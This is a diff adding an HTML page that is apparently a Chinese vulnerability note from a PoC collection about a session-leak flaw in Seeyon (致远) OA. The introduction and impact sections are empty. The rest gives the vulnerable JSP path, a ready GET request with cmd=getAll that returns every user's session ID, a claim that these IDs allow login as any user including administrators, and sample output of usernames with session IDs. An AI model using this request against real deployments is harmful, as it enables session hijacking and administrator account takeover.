@@ -1,0 +1,39 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="致远oa-session泄漏漏洞"><span class="csECDA2D3">致远</span><span class="csDE05BCC">OA Session</span><span class="csECDA2D3">泄漏漏洞</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<h5 class="cs868C439D">
+			<a name="漏洞位置"><span class="cs1C2E50E7">漏洞位置</span><span class="cs4B51D5E4">:</span></a></h5>
+		<p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/yyoa/ext/https/getSessionList.jsp</span></p><h5 class="cs868C439D">
+			<a name="漏洞详情"><span class="cs1C2E50E7">漏洞详情</span><span class="cs4B51D5E4">:</span></a></h5>
+		<p class="cs3A447A38"><span class="cs7FFD2630">当</span><span class="cs9FB05234">cmd</span><span class="cs7FFD2630">参数为</span><span class="cs9FB05234">getAll</span><span class="cs7FFD2630">时，便可获取到所有用户的</span><span class="cs9FB05234">SessionID</span><span class="cs7FFD2630">利用泄露的</span><span class="cs9FB05234">SessionID</span><span class="cs7FFD2630">即可登录该用户，包括管理员</span></p><h5 class="cs868C439D">
+			<a name="请求方式"><span class="cs1C2E50E7">请求方式</span><span class="cs4B51D5E4">:</span></a></h5>
+		<p class="cs3A447A38"><span class="cs9FB05234">Get</span></p><h5 class="cs868C439D">
+			<a name="poc"><span class="cs4B51D5E4">POC:</span></a></h5>
+		<p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/yyoa/ext/https/getSessionList.jsp?cmd=getAll</span></p><h5 class="cs868C439D">
+			<a name="回显内容"><span class="cs1C2E50E7">回显内容</span></a></h5>
+		<p class="cs3A447A38"><span class="cs9FB05234">weiph 9EA4F8832FA1C9BA99E3D13E2F01CAF7zhaozy F9244E7F1B8C39BB8919FAE8E19ED16</span></p></body>
+</html>
